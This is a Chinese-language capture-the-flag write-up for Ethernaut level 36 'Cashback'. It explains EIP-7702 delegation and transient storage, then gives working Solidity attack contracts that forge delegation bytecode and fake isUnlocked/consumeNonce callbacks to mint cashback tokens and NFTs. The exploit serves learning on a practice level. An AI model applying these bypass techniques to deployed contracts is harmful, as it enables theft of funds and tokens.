# Ethernaut 第36关：Cashback

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {ERC1155} from "openzeppelin-contracts-v5.4.0/token/ERC1155/ERC1155.sol";
import {TransientSlot} from "openzeppelin-contracts-v5.4.0/utils/TransientSlot.sol";

/*//////////////////////////////////////////////////////////////
                        货币库
//////////////////////////////////////////////////////////////*/

// 定义Currency类型为地址的包装类型
type Currency is address;

// 为Currency类型全局绑定相等比较方法
using {equals as ==} for Currency global;
// 为Currency类型全局绑定库函数
using CurrencyLibrary for Currency global;

// 实现Currency类型的相等比较
function equals(Currency currency, Currency other) pure returns (bool) {
    return Currency.unwrap(currency) == Currency.unwrap(other);
}

// 货币处理库
library CurrencyLibrary {
    // 错误定义
    error NativeTransferFailed(); // 原生代币转账失败
    error ERC20IsNotAContract(); // ERC20地址不是合约
    error ERC20TransferFailed(); // ERC20转账失败

    // 原生货币的标识（以太坊为0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE）
    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    // 判断是否为原生货币
    function isNative(Currency currency) internal pure returns (bool) {
        return Currency.unwrap(currency) == Currency.unwrap(NATIVE_CURRENCY);
    }

    // 通用转账函数（支持原生代币和ERC20）
    function transfer(Currency currency, address to, uint256 amount) internal {
        if (currency.isNative()) {
            // 原生代币转账
            (bool success,) = to.call{value: amount}("");
            require(success, NativeTransferFailed());
        } else {
            // ERC20代币转账
            (bool success, bytes memory data) = Currency.unwrap(currency).call(abi.encodeCall(IERC20.transfer, (to, amount)));
            // 检查目标地址是否为合约
            require(Currency.unwrap(currency).code.length != 0, ERC20IsNotAContract());
            // 检查调用是否成功
            require(success, ERC20TransferFailed());
            // 检查返回值（兼容不同的ERC20实现）
            require(data.length == 0 || true == abi.decode(data, (bool)), ERC20TransferFailed());
        }
    }

    // 将货币地址转换为uint256类型的ID（用于ERC1155的token ID）
    function toId(Currency currency) internal pure returns (uint256) {
        return uint160(Currency.unwrap(currency));
    }
}

/*//////////////////////////////////////////////////////////////
                       返现合约
//////////////////////////////////////////////////////////////*/

/// @dev 存储布局标识：keccak256(abi.encode(uint256(keccak256("Cashback")) - 1)) & ~bytes32(uint256(0xff))
contract Cashback is ERC1155 {
    using TransientSlot for *;

    // 错误定义
    error CashbackNotCashback(); // 调用者不是Cashback合约
    error CashbackIsCashback(); // 调用者是Cashback合约
    error CashbackNotAllowedInCashback(); // 不允许在Cashback合约上下文执行
    error CashbackOnlyAllowedInCashback(); // 仅允许在Cashback合约上下文执行
    error CashbackNotDelegatedToCashback(); // 未委托给Cashback合约
    error CashbackNotEOA(); // 不是外部拥有账户（EOA）
    error CashbackNotUnlocked(); // 未解锁
    error CashbackSuperCashbackNFTMintFailed(); // 超级返现NFT铸造失败

    // 瞬态存储槽标识：用于标记合约是否解锁
    bytes32 internal constant UNLOCKED_TRANSIENT = keccak256("cashback.storage.Unlocked");
    // 基准点（10000代表100%）
    uint256 internal constant BASIS_POINTS = 10000;
    // 超级返现NFT的触发随机数
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    // 当前合约的不可变引用
    Cashback internal immutable CASHBACK_ACCOUNT = this;
    // 超级返现NFT合约地址
    address public immutable superCashbackNFT;

    // 随机数（用于跟踪操作次数）
    uint256 public nonce;
    // 各货币的返现率（基点）
    mapping(Currency => uint256) public cashbackRates;
    // 各货币的最大返现额度
    mapping(Currency => uint256) public maxCashback;

    // 修饰器：仅允许Cashback合约自身调用
    modifier onlyCashback() {
        require(msg.sender == address(CASHBACK_ACCOUNT), CashbackNotCashback());
        _;
    }

    // 修饰器：禁止Cashback合约自身调用
    modifier onlyNotCashback() {
        require(msg.sender != address(CASHBACK_ACCOUNT), CashbackIsCashback());
        _;
    }

    // 修饰器：禁止在Cashback合约上下文执行
    modifier notOnCashback() {
        require(address(this) != address(CASHBACK_ACCOUNT), CashbackNotAllowedInCashback());
        _;
    }

    // 修饰器：仅允许在Cashback合约上下文执行
    modifier onlyOnCashback() {
        require(address(this) == address(CASHBACK_ACCOUNT), CashbackOnlyAllowedInCashback());
        _;
    }

    // 修饰器：仅允许委托给Cashback的合约调用
    modifier onlyDelegatedToCashback() {
        bytes memory code = msg.sender.code;

        address payable delegate;
        assembly {
            // 从调用者的字节码中读取委托地址（假设存储在特定位置）
            delegate := mload(add(code, 0x17))
        }
        require(Cashback(delegate) == CASHBACK_ACCOUNT, CashbackNotDelegatedToCashback());
        _;
    }

    // 修饰器：仅允许外部拥有账户（EOA）调用
    modifier onlyEOA() {
        require(msg.sender == tx.origin, CashbackNotEOA());
        _;
    }

    // 修饰器：解锁合约（设置瞬态存储标记）
    modifier unlock() {
        UNLOCKED_TRANSIENT.asBoolean().tstore(true);
        _;
        UNLOCKED_TRANSIENT.asBoolean().tstore(false);
    }

    // 修饰器：仅允许已解锁的账户调用
    modifier onlyUnlocked() {
        require(Cashback(payable(msg.sender)).isUnlocked(), CashbackNotUnlocked());
        _;
    }

    // 接收原生代币的回退函数（禁止Cashback合约自身转账）
    receive() external payable onlyNotCashback {}

    // 构造函数
    constructor(
        address[] memory cashbackCurrencies, // 返现支持的货币列表
        uint256[] memory currenciesCashbackRates, // 对应货币的返现率
        uint256[] memory currenciesMaxCashback, // 对应货币的最大返现额度
        address _superCashbackNFT // 超级返现NFT合约地址
    ) ERC1155("") {
        uint256 len = cashbackCurrencies.length;
        for (uint256 i = 0; i < len; i++) {
            cashbackRates[Currency.wrap(cashbackCurrencies[i])] = currenciesCashbackRates[i];
            maxCashback[Currency.wrap(cashbackCurrencies[i])] = currenciesMaxCashback[i];
        }

        superCashbackNFT = _superCashbackNFT;
    }

    // 实现层函数：累计返现
    function accrueCashback(Currency currency, uint256 amount) external onlyDelegatedToCashback onlyUnlocked onlyOnCashback {
        // 消耗调用者的随机数
        uint256 newNonce = Cashback(payable(msg.sender)).consumeNonce();
        // 计算返现金额
        uint256 cashback = (amount * cashbackRates[currency]) / BASIS_POINTS;

        if (cashback != 0) {
            // 获取该货币的最大返现额度
            uint256 _maxCashback = maxCashback[currency];
            // 检查是否超过最大返现额度
            if (balanceOf(msg.sender, currency.toId()) + cashback > _maxCashback) {
                cashback = _maxCashback - balanceOf(msg.sender, currency.toId());
            }

            // 铸造ERC1155返现代币
            uint256[] memory ids = new uint256[](1);
            ids[0] = currency.toId();
            uint256[] memory values = new uint256[](1);
            values[0] = cashback;
            _update(address(0), msg.sender, ids, values);
        }

        // 当随机数达到超级返现阈值时，铸造NFT
        if (SUPERCASHBACK_NONCE == newNonce) {
            (bool success,) = superCashbackNFT.call(abi.encodeWithSignature("mint(address)", msg.sender));
            require(success, CashbackSuperCashbackNFTMintFailed());
        }
    }

    // 智能账户函数：使用返现支付
    function payWithCashback(Currency currency, address receiver, uint256 amount) external unlock onlyEOA notOnCashback {
        // 转账指定货币给接收方
        currency.transfer(receiver, amount);
        // 调用Cashback合约累计返现
        CASHBACK_ACCOUNT.accrueCashback(currency, amount);
    }

    // 消耗随机数（递增并返回新值）
    function consumeNonce() external onlyCashback notOnCashback returns (uint256) {
        return ++nonce;
    }

    // 检查合约是否处于解锁状态
    function isUnlocked() public view returns (bool) {
        return UNLOCKED_TRANSIENT.asBoolean().tload();
    }
}
```

### 获胜条件分析
我们可以从以下代码片段中查看获胜条件：

```solidity
function validateInstance(address payable _instance, address _player) public view override returns (bool) {
        bytes23 expectedCode = bytes23(bytes.concat(hex"ef0100", abi.encodePacked(_instance)));

        return Cashback(_instance).balanceOf(_player, Currency.wrap(NATIVE_CURRENCY).toId()) == NATIVE_MAX_CASHBACK
            && Cashback(_instance).balanceOf(_player, Currency.wrap(address(FREE)).toId()) == FREE_MAX_CASHBACK
            && ERC721(Cashback(_instance).superCashbackNFT()).ownerOf(uint256(uint160(_player))) == _player
            && ERC721(Cashback(_instance).superCashbackNFT()).balanceOf(_player) >= 2 && _player.code.length == 23
            && bytes23(_player.code) == expectedCode;
    }
```

这段代码来自Ethernaut的源码[CashbackFactory.sol](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/src/levels/CashbackFactory.sol)。从中可以看出，我们需要满足以下条件：

1. 玩家的原生代币余额等于`NATIVE_MAX_CASHBACK`。
2. 玩家的免费代币（FREE）余额等于`FREE_MAX_CASHBACK`。
3. 玩家的超级返现NFT余额大于或等于2，且其中一个NFT的代币ID为玩家的地址。
4. 玩家地址的代码需为`0xef0100`拼接实例地址的格式（总计23字节）。

要真正理解这个Cashback合约的作用，我们需要掌握`EIP-7702`、`ERC-1155`以及该合约的其他特性相关的背景知识。

## EIP-7702
条件4中提到“玩家的代码”看起来有些奇怪，因为外部拥有账户（EOA）原本不应有任何代码。但这在`EIP-7702`升级之前才成立。在新发布的`EIP-7702`升级后，用户可以通过签署委托给实现合约地址的授权（**`vm.signAndAttachDelegation(address, publicKey)`**），在自己的EOA地址下部署形如`0xef0100`拼接实现地址的23字节代码。通过这种方式，EOA可以充当**智能账户**，使用实现合约的ABI并拥有自己的持久化存储。

EIP-7702升级带来了诸多优势：EOA无需部署智能合约钱包，就能获得其大部分功能，还能实现批量交易（一次完成授权+转账）、使用非ETH代币支付燃气费、委托授权/密钥恢复以及更灵活的钱包逻辑等。更多信息可参考[官方文档](https://eips.ethereum.org/EIPS/eip-7702)，此外[这篇博客](https://piatoss3612.tistory.com/203)和[Patrick Collins的视频](https://www.youtube.com/watch?v=0uy4nd8vIe8)深入探讨了EIP-7702中的授权协议和4型交易。

## ERC-1155
`ERC-1155`是一种多代币标准，可在单个合约中同时管理可替代代币和非同质化代币。这意味着一个合约就能管理多种不同类型的代币，而在没有ERC-1155的情况下，每种代币都需要一个单独的合约。更多信息可参考[以太坊官方文档](https://ethereum.org/developers/docs/standards/tokens/erc-1155/)。

## 瞬态存储
Cashback合约中出现的`using TransientSlot for *;`是另一项特性。瞬态存储是EVM的一种新数据存储位置，其行为类似存储（键值对、32字节槽位），但**仅在单个交易的持续时间内存在**。交易完成（所有调用返回）后，数据会自动清除。它引入了两个新操作码：TSTORE（存储到瞬态槽位）和TLOAD（从瞬态槽位读取）。瞬态存储按合约作用域划分（不跨无关合约全局共享），除非使用委托调用。

瞬态存储填补了内存（调用结束时清除）和存储（跨交易持久化）之间的空白，允许在**单个交易内的多次调用**（包括外部合约调用）中保存状态，而无需写入持久化存储。通常它被用作避免合约持久化存储的安全机制。

## 合约分析
现在我们可以对该合约进行全面分析。Cashback合约包含多个修饰器，根据其作用范围和功能，可分为三类：上下文修饰器（`notOnCashback`、`onlyOnCashback`）、调用者修饰器（`onlyCashback`、`onlyNotCashback`、`onlyEOA`、`onlyDelegatedToCashback`）和瞬态存储相关修饰器（`unlock`、`onlyUnlocked`）。

### 上下文修饰器
这类修饰器以`address(this)`作为判断依据，这一点可能令人困惑——直观上`address(this)`应始终等于`address(CASHBACK_ACCOUNT)`。但如果其他代理通过**委托调用**该合约，情况就不同了，因为此时的**上下文**会变成代理合约的地址。该合约可同时作为委托调用和普通调用的目标，因此需要通过上下文修饰器确保函数调用的上下文正确。

### 调用者修饰器
这类修饰器通过`msg.sender`定义谁可以调用函数。例如，在`function consumeNonce() external onlyCashback notOnCashback returns (uint256)`函数中，`onlyCashback`修饰器确保只有Cashback合约自身能调用该函数修改随机数（nonce）。其中最复杂的是`onlyDelegatedToCashback`：

```solidity
modifier onlyDelegatedToCashback() {
        bytes memory code = msg.sender.code;

        address payable delegate;
        assembly {
            delegate := mload(add(code, 0x17))
        }
        require(Cashback(delegate) == CASHBACK_ACCOUNT, CashbackNotDelegatedToCashback());
        _;
    }
```

可以看到，它通过内联汇编检查`msg.sender.code`的某个位置。需要注意的是，当字节数据加载到内存时，会以32字节的头部开头（存储数据长度），随后才是实际数据。因此在偏移量`0x17`（从头部起始位置开始）处，通过`mload`加载32字节槽位，其最后20字节即为目标地址。

因此`msg.sender.code`的格式可对应EIP-7702，为`0xef0100`拼接实现地址的23字节代码。在这种场景下，EOA委托给Cashback合约并调用其函数。

### 其他修饰器
`unlock`和`onlyUnlocked`修饰器用于启用/禁用瞬态存储，并检查其锁定状态。

### 合约的常规使用流程
该合约的常规使用流程如下：

1. 用户通过EOA签署对合约实例的委托授权，然后调用`payWithCashback`函数。该函数会解锁瞬态存储，且仅允许EOA调用（`onlyEOA`），并在EOA的上下文执行（`notOnCashback`）。
2. 在`payWithCashback`函数内部，合约实例首先转账指定数量的代币，然后调用`CASHBACK_ACCOUNT.accrueCashback`。此时`msg.sender`仍为EOA，但上下文已切换到Cashback合约（因为调用来自`CASHBACK_ACCOUNT`），需要访问实例的存储来计算返现。
3. 在`accrueCashback`执行过程中，合约实例在EOA的上下文修改随机数（`function consumeNonce() external onlyCashback notOnCashback`）。因此当EOA的随机数达到10000时，可铸造NFT。EOA无法直接调用`consumeNonce()`修改自己的随机数，因为该函数有`onlyCashback`限制。

## 攻击策略
该合约看似通过多重修饰器实现了严格的访问控制，无懈可击，但仔细分析后可发现三个**根本性**漏洞：

1. **存储冲突与重叠**：尽管瞬态存储会在交易结束后清除，但EOA的存储仍会持久化。而合约的随机数计数机制依赖于**EOA的存储**，这意味着我们可以找到修改自身存储的方法来伪造随机数。

2. **有缺陷的委托检查**：在`onlyDelegatedToCashback`修饰器中，对EIP-7702委托的检查逻辑存在严重缺陷。它仅检查代码中第4字节到第23字节的地址部分，却未验证前3字节的头部。我们可以在前三字节中植入跳转操作码，跳过后续20字节，让合约误认为我们已委托给它，同时在23字节后的代码中植入恶意逻辑。

3. **过度信任`msg.sender`**：在`accrueCashback`函数中，合约在`msg.sender`的上下文中检查`isUnlocked()`的结果。而`msg.sender`可植入恶意逻辑，让`isUnlocked()`始终返回`true`。

基于获胜条件，我们可采用分两阶段的攻击策略：

1. **第一阶段**：编写`CashbackAttack`攻击合约，包含`attack`、`isUnlocked`和`consumeNonce`函数。将其编译为字节码后，添加23字节的头部以绕过修饰器检查，然后手动部署篡改后的字节码。在`attack`函数中直接调用`accrueCashback`，通过恶意篡改的`isUnlocked`和`consumeNonce`函数通过所有修饰器检查，直接铸造NFT，并将所有返现转移到自己的EOA。

2. **第二阶段**：此时我们已拥有足够的返现，但仍缺少代币ID为玩家地址的NFT（第一阶段中NFT的代币ID为攻击合约地址）。因此需要通过EOA向实例进行一次真实委托：首先委托给一个随机数设置合约，将EOA的存储随机数修改为9999；然后委托给Cashback实例并调用`payWithCashback`，获取代币ID为玩家地址的NFT，同时让EOA拥有有效的23字节代码。

`CashbackAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "openzeppelin-contracts-v5.4.0/token/ERC20/IERC20.sol";
import {IERC721} from "openzeppelin-contracts-v5.4.0/token/ERC721/IERC721.sol";
import {Currency, Cashback} from "src/levels/Cashback.sol";

contract CashbackAttack {
    uint256 internal constant SUPERCASHBACK_NONCE = 10000;
    uint256 internal constant NATIVE_AMOUNT = 200000000000000000000;
    uint256 internal constant FREEDOM_COIN_AMOUNT = 25000000000000000000000;
    uint256 constant NATIVE_MAX_CASHBACK = 1 ether;
    uint256 constant FREE_MAX_CASHBACK = 500 ether;

    Currency public constant NATIVE_CURRENCY = Currency.wrap(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    bool nonceOnce;

    function attack(Cashback cashbackContract, IERC20 freedomCoin, IERC721 superCashbackNFT, address recovery)
        external
    {
        Currency freedomCoinCurrency = Currency.wrap(address(freedomCoin));

        // 获取两种货币的最大返现
        cashbackContract.accrueCashback(NATIVE_CURRENCY, NATIVE_AMOUNT);
        cashbackContract.accrueCashback(freedomCoinCurrency, FREEDOM_COIN_AMOUNT);

        // 将余额转移到恢复地址
        cashbackContract.safeTransferFrom(address(this), recovery, NATIVE_CURRENCY.toId(), NATIVE_MAX_CASHBACK, "");
        cashbackContract.safeTransferFrom(address(this), recovery, freedomCoinCurrency.toId(), FREE_MAX_CASHBACK, "");

        // 将超级返现NFT转移到恢复地址
        superCashbackNFT.transferFrom(address(this), recovery, uint256(uint160(address(this))));
    }

    function isUnlocked() public pure returns (bool) {
        return true;
    }

    function consumeNonce() external returns (uint256) {
        if (!nonceOnce) {
            nonceOnce = true;
            return SUPERCASHBACK_NONCE;
        }
        return 0;
    }
}

contract CashbackAttackNonceSetter layout at 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba03 {
    uint256 public nonce;

    function setNonce(uint256 newNonce) external {
        nonce = newNonce;
    }
}

contract CashbackAttackBytecodeDeployer {
    function deployFromBytecode(bytes memory bytecode) public returns (address) {
        address child;
        assembly {
            child := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        return child;
    }
}
```

我们**必须**注意的一点是，在23字节的头部（第一阶段）之后，`CashbackAttack` 的字节码中所有 **jump** 操作码的操作数都应该加上偏移量 `0x18`（在23字节头部之后的第24个字节处还有一个额外的 **jumpdest** 操作码，然后才是其余的逻辑）。因此，我们必须**反汇编**原始的 `CashbackAttack` 字节码。
